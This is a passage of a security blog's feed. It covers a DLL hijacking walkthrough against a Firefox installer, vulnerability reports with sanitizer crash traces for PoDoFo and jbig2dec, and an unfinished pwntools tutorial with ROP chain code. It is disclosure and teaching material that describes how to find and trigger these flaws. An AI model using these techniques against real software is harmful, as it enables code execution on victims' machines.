SP2&#x4E2D;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x8BE5;&#x8868;&#x9879;&#xFF0C;&#x8868;&#x793A;&#x9ED8;&#x8BA4;&#x5F00;&#x542F;&#x72B6;&#x6001;<p></p><h3 id="&#x6F0F;&#x6D1E;&#x7F13;&#x89E3;"><a href="#&#x6F0F;&#x6D1E;&#x7F13;&#x89E3;" class="headerlink" title="&#x6F0F;&#x6D1E;&#x7F13;&#x89E3;"></a>&#x6F0F;&#x6D1E;&#x7F13;&#x89E3;</h3><p>SetDllDirectory&#x3000;API&#xFF0C;&#x5F53;&#x7ED9;&#x8FD9;&#x4E2A;API&#x4F20;&#x9012;&#x4E00;&#x4E2A;&#x7A7A;&#x5B57;&#x7B26;&#x4E32;&#x65F6;&#xFF0C;&#x5C06;&#x53EF;&#x4EE5;&#x5C06;&#x5F53;&#x524D;&#x76EE;&#x5F55;&#x4ECE;DLL&#x641C;&#x7D22;&#x987A;&#x5E8F;&#x4E2D;&#x6392;&#x9664;&#x6389;&#x3002;</p><h3 id="&#x8BC6;&#x522B;&#x6D41;&#x7A0B;"><a href="#&#x8BC6;&#x522B;&#x6D41;&#x7A0B;" class="headerlink" title="&#x8BC6;&#x522B;&#x6D41;&#x7A0B;"></a>&#x8BC6;&#x522B;&#x6D41;&#x7A0B;</h3><p>&#x4F7F;&#x7528;&#x73AF;&#x5883;&amp;&#x5DE5;&#x5177;<br></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Win 7 32 bit Sp1</span><br><span class="line">process monitor</span><br></pre></td></tr></tbody></table></figure><br>&#x56E0;&#x4E3A;process monitor&#x80FD;&#x591F;&#x67E5;&#x770B;&#x6240;&#x6709;&#x8FDB;&#x7A0B;&#x5728;&#x5C1D;&#x8BD5;&#x52A0;&#x8F7D;&#x7684;&#x6587;&#x4EF6;&#x4EE5;&#x53CA;&#x987A;&#x5E8F;&#xFF0C;&#x56E0;&#x6B64;&#x8BBE;&#x7F6E;&#x597D;&#x89C4;&#x5219;&#x5C31;&#x80FD;&#x591F;&#x5224;&#x65AD;&#x662F;&#x5426;&#x5B58;&#x5728;DLL&#x52AB;&#x6301;&#x6F0F;&#x6D1E;&#x3002;<br>&#x73B0;&#x5047;&#x8BBE;&#x51C6;&#x5907;&#x68C0;&#x6D4B;Firefox&#x7684;&#x5B89;&#x88C5;&#x7A0B;&#x5E8F;&#x662F;&#x5426;&#x5B58;&#x5728;DLL&#x52AB;&#x6301;&#x3002;<br>Firefox&#x6253;&#x5F00;&#x540E;&#xFF0C;&#x8FDB;&#x7A0B;&#x4E2D;&#x5305;&#x542B;&#x201D;Firefox&#x201D;&#x5173;&#x952E;&#x5B57;&#xFF0C;&#x56E0;&#x6B64;&#x89C4;&#x5219;&#x4E3A;:<br><img src="/images/DLL-Hijacking/1.PNG" alt="Firefox"><br>Firefox&#x5728;&#x684C;&#x9762;&#x4E0A;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x5224;&#x65AD;&#x662F;&#x5426;&#x5728;&#x5C1D;&#x8BD5;&#x52A0;&#x8F7D;&#x5F53;&#x524D;&#x76EE;&#x5F55;&#x7684;DLL&#xFF0C;&#x56E0;&#x6B64;&#x8BBE;&#x7F6E;&#x8DEF;&#x5F84;&#x4E3A;&#x5F53;&#x524D;&#x76EE;&#x5F55;<br><img src="/images/DLL-Hijacking/2.PNG" alt="&#x8BBE;&#x7F6E;&#x5F53;&#x524D;&#x8DEF;&#x5F84;"><br>&#x7136;&#x540E;&#x8FC7;&#x6EE4;&#x6389;&#x52A0;&#x8F7D;&#x6210;&#x529F;&#x7684;DLL<br><img src="/images/DLL-Hijacking/3.PNG" alt="&#x8FC7;&#x6EE4;&#x6210;&#x529F;DLL"><br>&#x4FDD;&#x5B58;&#x4E4B;&#x540E;&#xFF0C;&#x7136;&#x540E;&#x6253;&#x5F00;Firefox&#x5B89;&#x88C5;&#x7A0B;&#x5E8F;&#xFF0C;&#x6211;&#x4EEC;&#x53D1;&#x73B0;&#x5C1D;&#x8BD5;&#x5728;&#x684C;&#x9762;&#x52A0;&#x8F7D;&#x7684;DLL&#x7A0B;&#x5E8F;&#xFF0C;&#x6B64;&#x65F6;&#x53EA;&#x9700;&#x8981;&#x6784;&#x9020;&#x4E00;&#x4E2A;DLL&#x76F8;&#x540C;&#x540D;&#x5B57;&#x7684;&#x6076;&#x610F;DLL&#x5373;&#x53EF;&#x5B9E;&#x73B0;&#x6076;&#x610F;DLL&#x6267;&#x884C;&#x3002;<br><img src="/images/DLL-Hijacking/4.PNG" alt="&#x5C1D;&#x8BD5;&#x52A0;&#x8F7D;&#x7684;DLL"><br><img src="/images/DLL-Hijacking/5.PNG" alt="&#x6784;&#x9020;&#x6076;&#x610F;DLL"><br><img src="/images/DLL-Hijacking/6.PNG" alt="&#x70B9;&#x51FB;&#x5B9E;&#x73B0;&#x5229;&#x7528;"><p></p><h3 id="&#x53C2;&#x8003;"><a href="#&#x53C2;&#x8003;" class="headerlink" title="&#x53C2;&#x8003;"></a>&#x53C2;&#x8003;</h3><p><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx</a><br><a href="http://www.programlife.net/a-deep-insight-into-dll-hijacking-vulnerability.html" target="_blank" rel="noopener">http://www.programlife.net/a-deep-insight-into-dll-hijacking-vulnerability.html</a><br><a href="http://www.freebuf.com/articles/78807.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/78807.html</a><br><a href="https://security.tencent.com/index.php/blog/msg/20" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/20</a></p></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> vuls </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PoDoFo 0.9.5 NULL pointer dereference</title>
      <link href="/2017/04/21/PoDoFo-1/"/>
      <url>/2017/04/21/PoDoFo-1/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>PoDoFo 0.9.5 function TextExtractor::ExtractText in TextExtractor.cpp:77 cause a NULL pointer dereference</p><h2 id="Analyzer"><a href="#Analyzer" class="headerlink" title="Analyzer"></a>Analyzer</h2><p>code from <a href="https://sourceforge.net/p/podofo/code/HEAD/tree/podofo/trunk/" target="_blank" rel="noopener">https://sourceforge.net/p/podofo/code/HEAD/tree/podofo/trunk/</a>  (2017-04-09)</p><p>compile:<br></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmake -G <span class="hljs-string">&quot;Unix Makefiles&quot;</span> -DCMAKE_INSTALL_PREFIX=/home/icepng/aaaa/ -DCMAKE_BUILD_TYPE=DEBUG -DCMAKE_EXE_LINKER_FLAGS=<span class="hljs-string">&quot;-fsanitize=address -fno-omit-frame-pointer&quot;</span> ../</span><br><span class="line">make -j</span><br></pre></td></tr></tbody></table></figure><br>and run it:<br><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./podofo-code/podofo/trunk/build/tools/podofotxtextract/podofotxtextract ./PoC</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="Crash-Info"><a href="#Crash-Info" class="headerlink" title="Crash Info"></a>Crash Info</h2><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">=================================================================</span><br><span class="line">==12966==ERROR: AddressSanitizer: SEGV on unknown address 0xbebec0bd (pc 0x080f4c21 bp 0xbf8fcbc8 sp 0xbf8fcbc0 T0)</span><br><span class="line">    <span class="hljs-comment">#0 0x80f4c20 in PoDoFo::PdfVariant::DelayedLoad() const /home/icepng/podofo-code/podofo/trunk/podofo/base/../../src/base/PdfVariant.h:545</span></span><br><span class="line">    <span class="hljs-comment">#1 0x80f4c8f in PoDoFo::PdfVariant::GetReal() const /home/icepng/podofo-code/podofo/trunk/src/base/PdfVariant.h:675</span></span><br><span class="line">    <span class="hljs-comment">#2 0x80f38af in TextExtractor::ExtractText(PoDoFo::PdfMemDocument*, PoDoFo::PdfPage*) /home/icepng/podofo-code/podofo/trunk/tools/podofotxtextract/TextExtractor.cpp:77</span></span><br><span class="line">    <span class="hljs-comment">#3 0x80f36a5 in TextExtractor::Init(char const*) /home/icepng/podofo-code/podofo/trunk/tools/podofotxtextract/TextExtractor.cpp:48</span></span><br><span class="line">    <span class="hljs-comment">#4 0x80f6ceb in main /home/icepng/podofo-code/podofo/trunk/tools/podofotxtextract/podofotxtextract.cpp:52</span></span><br><span class="line">    <span class="hljs-comment">#5 0xb6a9b636 in __libc_start_main (/lib/i386-linux-gnu/libc.so.6+0x18636)</span></span><br><span class="line">    <span class="hljs-comment">#6 0x80f3470  (/home/icepng/podofo-code/podofo/trunk/build/tools/podofotxtextract/podofotxtextract+0x80f3470)</span></span><br><span class="line"></span><br><span class="line">AddressSanitizer can not provide additional info.</span><br><span class="line">SUMMARY: AddressSanitizer: SEGV /home/icepng/podofo-code/podofo/trunk/podofo/base/../../src/base/PdfVariant.h:545 PoDoFo::PdfVariant::DelayedLoad() const</span><br><span class="line">==12966==ABORTING</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="analysis"><a href="#analysis" class="headerlink" title="analysis"></a>analysis</h2><p>and the Process is easy, When use podofotxtextract to extract txt info from a pdf file, first extract the input file to a PdfMemDocument object, and then let each page to a PdfContentsTokenizer object, which contained many tokens, and last deal each token.</p><p></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span>( eType == ePdfContentsType_Keyword )</span><br><span class="line">        {</span><br><span class="line">            <span class="hljs-comment">// support &apos;l&apos; and &apos;m&apos; tokens</span></span><br><span class="line">            <span class="hljs-keyword">if</span>( <span class="hljs-built_in">strcmp</span>( pszToken, <span class="hljs-string">&quot;l&quot;</span> ) == <span class="hljs-number">0</span> ||  <span class="hljs-comment">// l: line to </span></span><br><span class="line">                <span class="hljs-built_in">strcmp</span>( pszToken, <span class="hljs-string">&quot;m&quot;</span> ) == <span class="hljs-number">0</span> )  <span class="hljs-comment">// m: move to </span></span><br><span class="line">            {</span><br><span class="line">                dCurPosX = <span class="hljs-built_in">stack</span>.top().GetReal();</span><br><span class="line">                <span class="hljs-built_in">stack</span>.pop();</span><br><span class="line">                dCurPosY = <span class="hljs-built_in">stack</span>.top().GetReal();</span><br><span class="line">                <span class="hljs-built_in">stack</span>.pop();</span><br><span class="line">            }</span><br><span class="line">......</span><br><span class="line"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( eType == ePdfContentsType_Variant )</span><br><span class="line">        {</span><br><span class="line">            <span class="hljs-built_in">stack</span>.push( var );</span><br><span class="line">        }</span><br></pre></td></tr></tbody></table></figure><br>I set the breakpoints and I found there had 45 ePdfContentsType_Variant but 23 MoveTo Tokens.<br>so stack.top() will be NULL in &#x201C;dCurPosY = stack.top().GetReal();&#x201D;, then cause a NULL point dereference.<br>So the upstream don&#x2019;t give strict check about Path Construction Operators &#x201C;MoveTo&#x201D;.<p></p></body></html>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>jbig2dec-vul</title>
      <link href="/2017/04/20/jbig2dec-vul/"/>
      <url>/2017/04/20/jbig2dec-vul/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>&#x4E24;&#x4E2A;jbig2dec&#x6F0F;&#x6D1E; fuzzing by afl</p><h3 id="jbig2dec-heap-buffer-overflow-in-function-jbig2-decode-symbol-dict"><a href="#jbig2dec-heap-buffer-overflow-in-function-jbig2-decode-symbol-dict" class="headerlink" title="jbig2dec heap buffer overflow in function jbig2_decode_symbol_dict"></a>jbig2dec heap buffer overflow in function jbig2_decode_symbol_dict</h3><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">=================================================================</span><br><span class="line">==24598==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xb5b03a80 at pc 0xb7ae9a75 bp 0xbfffd728 sp 0xbfffd2fc</span><br><span class="line">READ of size 158687 at 0xb5b03a80 thread T0</span><br><span class="line">    <span class="hljs-comment">#0 0xb7ae9a74 in __asan_memcpy (/usr/lib/i386-linux-gnu/libasan.so.2+0x8aa74)</span></span><br><span class="line">    <span class="hljs-comment">#1 0xb7ae9c2f in memcpy (/usr/lib/i386-linux-gnu/libasan.so.2+0x8ac2f)</span></span><br><span class="line">    <span class="hljs-comment">#2 0x80587ee in jbig2_decode_symbol_dict /home/icepng/Desktop/jbig2dec/jbig2_symbol_dict.c:644</span></span><br><span class="line">    <span class="hljs-comment">#3 0x805af6d in jbig2_symbol_dictionary /home/icepng/Desktop/jbig2dec/jbig2_symbol_dict.c:996</span></span><br><span class="line">    <span class="hljs-comment">#4 0x8051c35 in jbig2_parse_segment /home/icepng/Desktop/jbig2dec/jbig2_segment.c:234</span></span><br><span class="line">    <span class="hljs-comment">#5 0x804fb91 in jbig2_data_in /home/icepng/Desktop/jbig2dec/jbig2.c:312</span></span><br><span class="line">    <span class="hljs-comment">#6 0x804ab81 in main /home/icepng/Desktop/jbig2dec/jbig2dec.c:456</span></span><br><span class="line">    <span class="hljs-comment">#7 0xb78c1636 in __libc_start_main (/lib/i386-linux-gnu/libc.so.6+0x18636)</span></span><br><span class="line">    <span class="hljs-comment">#8 0x8048fc0  (/home/icepng/Desktop/jbig2dec/jbig2dec+0x8048fc0)</span></span><br><span class="line"></span><br><span class="line">0xb5b03a80 is located 0 bytes to the right of 2048-byte region [0xb5b03280,0xb5b03a80)</span><br><span class="line">allocated by thread T0 here:</span><br><span class="line">    <span class="hljs-comment">#0 0xb7af5dee in malloc (/usr/lib/i386-linux-gnu/libasan.so.2+0x96dee)</span></span><br><span class="line">    <span class="hljs-comment">#1 0x804d6df in jbig2_default_alloc /home/icepng/Desktop/jbig2dec/jbig2.c:36</span></span><br><span class="line">    <span class="hljs-comment">#2 0x804d781 in jbig2_alloc /home/icepng/Desktop/jbig2dec/jbig2.c:63</span></span><br><span class="line">    <span class="hljs-comment">#3 0x804e64b in jbig2_data_in /home/icepng/Desktop/jbig2dec/jbig2.c:213</span></span><br><span class="line">    <span class="hljs-comment">#4 0x804ab81 in main /home/icepng/Desktop/jbig2dec/jbig2dec.c:456</span></span><br><span class="line">    <span class="hljs-comment">#5 0xb78c1636 in __libc_start_main (/lib/i386-linux-gnu/libc.so.6+0x18636)</span></span><br></pre></td></tr></tbody></table></figure><br>CVE-2017-7885<br><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7885" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7885</a><p></p><h3 id="jbig2dec-0-13-Integer-Overflow-in-function-jbig2-image-compose"><a href="#jbig2dec-0-13-Integer-Overflow-in-function-jbig2-image-compose" class="headerlink" title="jbig2dec-0.13 Integer Overflow in function jbig2_image_compose"></a>jbig2dec-0.13 Integer Overflow in function jbig2_image_compose</h3><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">=================================================================</span><br><span class="line">==3138==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xb5c00497 at pc 0xb71c3c44 bp 0xbfdc3408 sp 0xbfdc33f8</span><br><span class="line">READ of size 1 at 0xb5c00497 thread T0</span><br><span class="line">    <span class="hljs-comment">#0 0xb71c3c43 in jbig2_image_compose /home/icepng/icepng/jbig2dec/jbig2_image.c:281</span></span><br><span class="line">    <span class="hljs-comment">#1 0xb71b4b9c in jbig2_decode_text_region /home/icepng/icepng/jbig2dec/jbig2_text.c:442</span></span><br><span class="line">    <span class="hljs-comment">#2 0xb71b703c in jbig2_text_region /home/icepng/icepng/jbig2dec/jbig2_text.c:858</span></span><br><span class="line">    <span class="hljs-comment">#3 0xb71abd0e in jbig2_parse_segment /home/icepng/icepng/jbig2dec/jbig2_segment.c:238</span></span><br><span class="line">    <span class="hljs-comment">#4 0xb71a51a5 in jbig2_data_in /home/icepng/icepng/jbig2dec/jbig2.c:312</span></span><br><span class="line">    <span class="hljs-comment">#5 0x80495e9 in main /home/icepng/icepng/jbig2dec/jbig2dec.c:456</span></span><br><span class="line">    <span class="hljs-comment">#6 0xb7000636 in __libc_start_main (/lib/i386-linux-gnu/libc.so.6+0x18636)</span></span><br><span class="line">    <span class="hljs-comment">#7 0x804a03f  (/home/icepng/icepng/jbig2dec/.libs/lt-jbig2dec+0x804a03f)</span></span><br><span class="line"></span><br><span class="line">0xb5c00497 is located 0 bytes to the right of 7-byte region [0xb5c00490,0xb5c00497)</span><br><span class="line">allocated by thread T0 here:</span><br><span class="line">    <span class="hljs-comment">#0 0xb726bdee in malloc (/usr/lib/i386-linux-gnu/libasan.so.2+0x96dee)</span></span><br><span class="line">    <span class="hljs-comment">#1 0xb71a3969 in jbig2_default_alloc /home/icepng/icepng/jbig2dec/jbig2.c:36</span></span><br><span class="line">    <span class="hljs-comment">#2 0xb71a3ae3 in jbig2_alloc /home/icepng/icepng/jbig2dec/jbig2.c:63</span></span><br><span class="line">    <span class="hljs-comment">#3 0xb71c2643 in jbig2_image_new /home/icepng/icepng/jbig2dec/jbig2_image.c:63</span></span><br><span class="line">    <span class="hljs-comment">#4 0xb71b273a in jbig2_decode_symbol_dict /home/icepng/icepng/jbig2dec/jbig2_symbol_dict.c:678</span></span><br><span class="line">    <span class="hljs-comment">#5 0xb71b273a in jbig2_symbol_dictionary /home/icepng/icepng/jbig2dec/jbig2_symbol_dict.c:996</span></span><br><span class="line">    <span class="hljs-comment">#6 0xb71abbee in jbig2_parse_segment /home/icepng/icepng/jbig2dec/jbig2_segment.c:234</span></span><br><span class="line">    <span class="hljs-comment">#7 0xb71a51a5 in jbig2_data_in /home/icepng/icepng/jbig2dec/jbig2.c:312</span></span><br><span class="line">    <span class="hljs-comment">#8 0x80495e9 in main /home/icepng/icepng/jbig2dec/jbig2dec.c:456</span></span><br><span class="line">    <span class="hljs-comment">#9 0xb7000636 in __libc_start_main (/lib/i386-linux-gnu/libc.so.6+0x18636)</span></span><br></pre></td></tr></tbody></table></figure><br>CVE-2017-7976<br><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7976" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7976</a><p></p></body></html>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pwntools 介绍</title>
      <link href="/2017/04/18/pwntools/"/>
      <url>/2017/04/18/pwntools/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>&#x53C2;&#x8003;&#x591A;&#x7BC7;blog&#x7684;&#x4E00;&#x4E2A;&#x603B;&#x7ED3;&#x4E0E;&#x6D4B;&#x8BD5;</p><h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><p>pwntools &#x662F;&#x4E00;&#x6B3E;&#x4E13;&#x95E8;&#x7528;&#x4E8E;CTF Exploit&#x7684;python&#x5E93;&#xFF0C;&#x80FD;&#x591F;&#x5F88;&#x65B9;&#x4FBF;&#x7684;&#x8FDB;&#x884C;&#x672C;&#x5730;&#x4E0E;&#x8FDC;&#x7A0B;&#x5229;&#x7528;&#x7684;&#x5207;&#x6362;&#xFF0C;&#x5E76;&#x4E14;&#x91CC;&#x9762;&#x5305;&#x542B;&#x591A;&#x4E2A;&#x6A21;&#x5757;&#xFF0C;&#x4F7F;&#x5229;&#x7528;&#x53D8;&#x5F97;&#x7B80;&#x5355;&#x3002;<br>&#x53EF;&#x4EE5;&#x5728;github&#x4E0A;&#x76F4;&#x63A5;&#x641C;&#x7D22;pwntools &#x8FDB;&#x884C;&#x5B89;&#x88C5;&#x3002;</p><h2 id="&#x57FA;&#x672C;&#x6A21;&#x5757;"><a href="#&#x57FA;&#x672C;&#x6A21;&#x5757;" class="headerlink" title="&#x57FA;&#x672C;&#x6A21;&#x5757;"></a>&#x57FA;&#x672C;&#x6A21;&#x5757;</h2><p>asm : &#x6C47;&#x7F16;&#x4E0E;&#x53CD;&#x6C47;&#x7F16;&#xFF0C;&#x652F;&#x6301;x86/x64/arm/mips/powerpc&#x7B49;&#x57FA;&#x672C;&#x4E0A;&#x6240;&#x6709;&#x7684;&#x4E3B;&#x6D41;&#x5E73;&#x53F0;<br>dynelf : &#x7528;&#x4E8E;&#x8FDC;&#x7A0B;&#x7B26;&#x53F7;&#x6CC4;&#x6F0F;&#xFF0C;&#x9700;&#x8981;&#x63D0;&#x4F9B;leak&#x65B9;&#x6CD5;<br>elf : &#x5BF9;elf&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x64CD;&#x4F5C;&#xFF0C;&#x53EF;&#x4EE5;&#x83B7;&#x53D6;elf&#x6587;&#x4EF6;&#x4E2D;&#x7684;PLT&#x6761;&#x76EE;&#x548C;GOT&#x6761;&#x76EE;&#x4FE1;&#x606F;<br>gdb : &#x914D;&#x5408;gdb&#x8FDB;&#x884C;&#x8C03;&#x8BD5;&#xFF0C;&#x8BBE;&#x7F6E;&#x65AD;&#x70B9;&#x4E4B;&#x540E;&#x4FBF;&#x80FD;&#x591F;&#x5728;&#x8FD0;&#x884C;&#x8FC7;&#x7A0B;&#x4E2D;&#x76F4;&#x63A5;&#x8C03;&#x7528;GDB&#x65AD;&#x4E0B;&#xFF0C;&#x7C7B;&#x4F3C;&#x4E8E;&#x8BBE;&#x7F6E;&#x4E3A;&#x5373;&#x4F7F;&#x8C03;&#x8BD5;JIT<br>memleak : &#x7528;&#x4E8E;&#x5185;&#x5B58;&#x6CC4;&#x6F0F;<br>shellcraft : shellcode&#x7684;&#x751F;&#x6210;&#x5668;</p><h2 id="asm-&#x6C47;&#x7F16;&#x6A21;&#x5757;"><a href="#asm-&#x6C47;&#x7F16;&#x6A21;&#x5757;" class="headerlink" title="asm &#x6C47;&#x7F16;&#x6A21;&#x5757;"></a>asm &#x6C47;&#x7F16;&#x6A21;&#x5757;</h2><p>&#x8FD9;&#x4E2A;&#x6A21;&#x5757;&#x63D0;&#x4F9B;&#x4E00;&#x4E9B;&#x57FA;&#x672C;&#x7684;&#x6C47;&#x7F16;&#x4E0E;&#x53CD;&#x6C47;&#x7F16;&#x64CD;&#x4F5C;&#xFF0C;&#x4E00;&#x822C;&#x53EF;&#x4EE5;&#x7528;linux&#x7684;objdump&#x4EE5;&#x53CA;IDA Pro&#x80FD;&#x591F;&#x5B8C;&#x6210;&#x57FA;&#x672C;&#x7684;&#x9700;&#x6C42;&#x3002;</p><h2 id="dynelf-&#x6A21;&#x5757;"><a href="#dynelf-&#x6A21;&#x5757;" class="headerlink" title="dynelf &#x6A21;&#x5757;"></a>dynelf &#x6A21;&#x5757;</h2><p>&#x8FD8;&#x672A;&#x8BD5;&#x8FC7;</p><h2 id="elf-&#x6A21;&#x5757;"><a href="#elf-&#x6A21;&#x5757;" class="headerlink" title="elf &#x6A21;&#x5757;"></a>elf &#x6A21;&#x5757;</h2><p>&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x9759;&#x6001;&#x6A21;&#x5757;&#xFF0C;&#x5373;&#x9759;&#x6001;&#x52A0;&#x8F7D;ELF&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x901A;&#x8FC7;&#x76F8;&#x5173;&#x63A5;&#x53E3;&#x83B7;&#x53D6;&#x4E00;&#x4E9B;&#x4FE1;&#x606F;&#xFF0C;&#x5E38;&#x7528;&#x63A5;&#x53E3;&#x6709;&#xFF1A;<br>got &#x83B7;&#x53D6;&#x6307;&#x5B9A;&#x51FD;&#x6570;&#x7684;GOT&#x6761;&#x76EE;<br>plt &#x83B7;&#x53D6;&#x6307;&#x5B9A;&#x51FD;&#x6570;&#x7684;PLT&#x6761;&#x76EE;<br>address &#x83B7;&#x53D6;ELF&#x7684;&#x57FA;&#x5740;<br>symbols &#x83B7;&#x53D6;&#x51FD;&#x6570;&#x7684;&#x5B9E;&#x9645;&#x5730;&#x5740;&#xFF08;&#x5F85;&#x786E;&#x5B9A;&#xFF09;<br>&#x4F7F;&#x7528;&#x4F8B;&#x5B50;&#xFF1A;<br></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#x4F8B;&#x5B50;)</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="gdb-&#x6A21;&#x5757;"><a href="#gdb-&#x6A21;&#x5757;" class="headerlink" title="gdb &#x6A21;&#x5757;"></a>gdb &#x6A21;&#x5757;</h2><p>&#x8BE5;&#x6A21;&#x5757;&#x7528;&#x4E8E;&#x8C03;&#x7528;gdb&#x8C03;&#x8BD5;<br>&#x5728;python&#x6587;&#x4EF6;&#x4E2D;&#x76F4;&#x63A5;&#x8BBE;&#x7F6E;&#x65AD;&#x70B9;&#xFF0C;&#x5F53;&#x8FD0;&#x884C;&#x5230;&#x8BE5;&#x4F4D;&#x7F6E;&#x4E4B;&#x540E;&#x5C31;&#x4F1A;&#x65AD;&#x4E0B;<br></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> pwnlib</span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = process(<span class="hljs-string">&apos;./c&apos;</span>)</span><br><span class="line">pwnlib.gdb.attach(p)</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="rop-&#x6A21;&#x5757;"><a href="#rop-&#x6A21;&#x5757;" class="headerlink" title="rop &#x6A21;&#x5757;"></a>rop &#x6A21;&#x5757;</h2><p>&#x7528;&#x4E8E;&#x81EA;&#x52A8;&#x4EA7;&#x751F;ROP&#x94FE; &#x8FD8;&#x4E0D;&#x652F;&#x6301;X64?<br></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="hljs-string">&apos;ropasaurusrex&apos;</span>)</span><br><span class="line">rop = ROP(elf)</span><br><span class="line">rop.call(<span class="hljs-string">&apos;read&apos;</span>, (<span class="hljs-number">0</span>, elf.bss(<span class="hljs-number">0x80</span>)))</span><br><span class="line">rop.dump() <span class="hljs-comment">## &#x5C55;&#x793A;&#x5F53;&#x524D;&#x7684;ROP chain</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">### &#x641C;&#x7D22;&#x6307;&#x5B9A;&#x6307;&#x4EE4; rop.search(move=0, regs=None, order=&apos;size&apos;)</span></span><br><span class="line"><span class="hljs-string">&apos;&apos;&apos;</span></span><br><span class="line"><span class="hljs-string">move(int)&#xFF0C;&#x6808;&#x6307;&#x9488;&#x8C03;&#x6574;&#x7684;&#x5B57;&#x8282;&#x6570;</span></span><br><span class="line"><span class="hljs-string">regs(list)&#xFF0C;&#x641C;&#x7D22;&#x7684;&#x5BC4;&#x5B58;&#x5668;list</span></span><br><span class="line"><span class="hljs-string">order(str)&#xFF0C;&#x591A;&#x4E2A;gadgets&#x7684;&#x6392;&#x5E8F;&#x65B9;&#x5F0F;&#xFF0C;&#x53EF;&#x9009;&#x503C;=[&apos;size&apos;, &apos;regs&apos;]</span></span><br><span class="line"><span class="hljs-string">&apos;&apos;&apos;</span></span><br><span class="line">rop.r13_r14_r15_rbp == rop.search(regs=[<span class="hljs-string">&apos;r13&apos;</span>,<span 